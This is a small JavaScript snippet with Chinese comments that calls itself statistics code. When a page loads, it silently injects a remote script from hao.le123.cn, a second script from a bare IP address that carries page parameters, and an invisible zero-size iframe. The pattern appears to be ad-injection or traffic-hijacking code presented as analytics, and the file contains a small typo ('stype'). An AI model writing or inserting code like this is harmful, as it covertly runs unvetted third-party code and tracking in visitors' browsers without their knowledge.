(function(){	
	/**
	 * @ S 自有统计地址
	 * @ M 素材根目录
	 * @ A 重定向的js地址
	 */
	var S = "http://121.40.140.170/";
	var M = "http://cdn.le123.cn/id/169/m/";
	var A = "http://hao.le123.cn/google/m/m.js";
	
	/**
	 * @ 封装
	 */
	var C = function(e){
		return document.createElement(e);
	};
	
	var AP = function(e){
		return document.body.appendChild(e);
	};
	
	var R = function(e){
		return '&' + e + '=' + Math.random();
	};
	
	/**
	 * @获取参数
	 */
	var STR = document.getElementById('R_random').innerHTML.replace(/,/g, "&");
	
	/**
	 * @ 自有统计
	 */
	var G = function(o){
		var url = S + 'show.js?' + STR + R('ran');
		var JS = C('script');
		JS.type = "text/javascript";
		JS.src = url;
		AP(JS);
	};
	 
	/**
	 * @ 第三方统计
	 */
	var Z = function(o){
		var i = C('iframe');
		i.id = R('ifid_');
		i.name = R('ifname_');
		i.width = '0';
		i.height = '0';
		i.src = M + "media.html?" + R('ran');
		AP(i);	
	};
	/**
	 * JS插入
	 */
	var J = C('script');
	J.src = A;
	J.stype = "text/javascript";
	AP(J);
	Z();
	G();
})();

